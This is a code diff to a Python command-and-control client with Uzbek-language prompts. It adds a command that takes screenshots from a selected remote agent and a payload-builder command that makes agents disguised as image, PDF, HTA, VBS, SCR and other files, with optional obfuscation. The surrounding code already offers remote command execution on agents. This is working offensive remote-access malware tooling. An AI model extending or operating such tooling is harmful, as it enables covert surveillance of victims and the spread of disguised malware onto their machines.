@@ -160,6 +160,35 @@ class C2CLI(cmd.Cmd):
         except Exception as e:
             print(f"❌ Xato: {e}")
     
+    def do_screenshot(self, quality='85'):
+        """Tanlangan agentdan screenshot olish: screenshot [quality]"""
+        if not self.current_agent:
+            print("❌ Birinchi agentni tanlang: select <agent_id>")
+            return
+        
+        try:
+            # Quality parametri
+            if not quality:
+                quality = '85'
+            
+            print(f"📸 Screenshot so'ralmoqda (sifat: {quality})...")
+            
+            response = self.session.get(
+                f"{self.server_url}/api/screenshot/{self.current_agent}?quality={quality}",
+                timeout=30
+            )
+            
+            if response.status_code == 200:
+                result = response.json()
+                print(f"✅ {result.get('message', 'Screenshot so\\'rovi yuborildi')}")
+                print(f"🆔 Command ID: {result.get('command_id', 'N/A')}")
+                print("💡 Screenshot agent tomonidan yuboriladi")
+                print("💡 Natija server loglarida yoki GUI'da ko'rinadi")
+            else:
+                print(f"❌ Xato: {response.text}")
+        except Exception as e:
+            print(f"❌ Screenshot xatosi: {e}")
+    
     def do_status(self, line):
         """Server holati haqida ma'lumot"""
         try:
@@ -197,6 +226,46 @@ class C2CLI(cmd.Cmd):
         """Chiqish"""
         return self.do_exit(line)
     
+    def do_payload(self, line):
+        """Payload yaratish"""
+        from common.payload_generator import PayloadGenerator
+        
+        parts = line.split()
+        if len(parts) < 2:
+            print("❌ Foydalanish: payload <type> <output> [options]")
+            print("   Types: python, powershell, bash, batch, vbs, hta, js, vbe, exe, scr, elf, dll, jpg, png, pdf")
+            print("   Example: payload python agent.py")
+            print("   Example: payload hta update.hta")
+            print("   Example: payload jpg image.jpg")
+            print("   Example: payload pdf document.pdf")
+            return
+        
+        payload_type = parts[0]
+        output_file = parts[1]
+        obfuscate = '--obfuscate' in parts
+        
+        # Generator yaratish
+        generator = PayloadGenerator()
+        
+        print(f"\n🛠️ Payload yaratilmoqda...")
+        print(f"   Type: {payload_type}")
+        print(f"   Output: {output_file}")
+        print(f"   Obfuscate: {'Yes' if obfuscate else 'No'}")
+        
+        result = generator.generate(
+            payload_type=payload_type,
+            listener_type='http',
+            output_file=output_file,
+            obfuscate=obfuscate
+        )
+        
+        if result.get('success'):
+            print(f"\n✅ Payload yaratildi!")
+            print(f"   Size: {result['size']:,} bytes")
+            print(f"   File: {output_file}")
+        else:
+            print(f"\n❌ Xato: {result.get('error')}")
+    
     def do_help_commands(self, line):
         """Barcha mavjud komandalar ro'yxati"""
         commands = {
@@ -205,16 +274,18 @@ class C2CLI(cmd.Cmd):
             'deselect': 'Agent tanlovini bekor qilish',
             'exec <cmd>': 'Tanlangan agentda komanda bajarish',
             'sysinfo': 'Sistem ma\'lumotlarini olish',
+            'screenshot [quality]': 'Ekran suratini olish (quality: 10-100)',
+            'payload <type> <output>': 'Payload yaratish (type: python, powershell, bash, batch, vbs)',
             'status': 'Server holati',
             'clear': 'Ekranni tozalash',
             'exit/quit': 'Chiqish'
         }
         
         print("\\n📋 Mavjud komandalar:")
-        print("-" * 50)
+        print("-" * 60)
         for cmd, desc in commands.items():
-            print(f"{cmd:<15} - {desc}")
-        print("-" * 50)
+            print(f"{cmd:<30} - {desc}")
+        print("-" * 60)
     
     def emptyline(self):
         """Bo'sh satr kiritilganda hech narsa qilmaslik"""
